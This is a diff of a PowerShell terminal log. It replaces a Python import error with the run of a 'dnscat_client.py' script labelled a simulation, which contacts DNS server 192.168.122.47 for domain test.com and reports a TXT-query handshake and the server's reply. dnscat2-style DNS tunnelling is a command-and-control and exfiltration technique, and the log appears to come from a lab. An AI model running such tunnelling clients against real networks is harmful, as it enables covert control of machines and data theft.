@@ -1,14 +1,11 @@
 
-PS C:\Users\User\user_behavior_generation\worker\venv\Scripts> .\activate
-(venv) PS C:\Users\User\user_behavior_generation\worker\venv\Scripts> pip install dnspython
-Requirement already satisfied: dnspython in c:\users\user\user_behavior_generation\worker\venv\lib\site-packages (2.8.0)
-(venv) PS C:\Users\User\user_behavior_generation\worker\venv\Scripts> .\python.exe C:\Users\User\user_behavior_generation\worker\dns.py
-Traceback (most recent call last):
-  File "C:\Users\User\user_behavior_generation\worker\dns.py", line 6, in <module>
-    import dns.resolver # Richiede: pip install dnspython
-    ^^^^^^^^^^^^^^^^^^^
-  File "C:\Users\User\user_behavior_generation\worker\dns.py", line 6, in <module>
-    import dns.resolver # Richiede: pip install dnspython
-    ^^^^^^^^^^^^^^^^^^^
-ModuleNotFoundError: No module named 'dns.resolver'; 'dns' is not a package
+(venv) PS C:\Users\User\user_behavior_generation\worker\venv\Scripts> .\python.exe C:\Users\User\user_behavior_generation\worker\dnscat_client.py --domain test.com --dns 192.168.122.47 --secret 0123456789
+
+--- AVVIO CLIENT DNSCAT2 (Simulazione) ---
+[*] Dominio Target: test.com
+[*] DNS Server (Gateway): 192.168.122.47
+[*] Secret configurato: SÌ
+[*] Pacchetto SYN generato: FAB200D2F895370000
+[*] Invio Query TXT a 192.168.122.47: FAB200D2F895370000.test.com...
+[+] CONNESSIONE RIUSCITA! Risposta dal server: 3d0d02d2f853657373696f6e206b696c6c65643a20546869732073657276657220726571756972657320616e20656e6372797074656420636f6e6e656374696f6e2100
 (venv) PS C:\Users\User\user_behavior_generation\worker\venv\Scripts>
